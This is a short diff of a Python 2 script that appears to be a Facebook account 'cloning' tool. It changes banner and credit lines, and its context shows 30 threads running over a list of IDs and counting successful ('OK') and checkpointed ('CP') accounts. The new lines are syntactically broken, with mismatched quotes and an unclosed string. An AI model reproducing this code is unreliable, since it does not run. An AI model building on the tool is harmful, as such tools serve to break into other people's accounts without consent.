@@ -285,7 +285,7 @@ def pilih_super():
 	print "\n\033[1;97m \x1b[1;91mTo Stop Process Press CTRL+ Z\033[1;97m"
 	print "\033[1;97m\033[1;92mTHANKS FOR USING\033[1;97m"
 	jalan(' \033[1;93mPLEASE WAIT CLONING IS IN PROCESS')
-	print "\033[1;32;40m Editing My Script Will Not a Master Of Coding.This is Hamza Offficial Here')
+	print "\033[1;;40m Editing My Script Will Not a Master Of Coding.This is Hamza Offficial Here \n")
 	print "\033[1;97m\033[1;92m\033[1;97"
 	
 			
@@ -406,7 +406,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	
-	print "  \033[1;91mANONYMOUS TRICKERS "
+	print "  \033[1;91mMuhammad Hamza
 	print '\033[1;92mProcess Has Been Completed\033[1;92m....'
 	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print" dont Use these commands for illegal purpose "
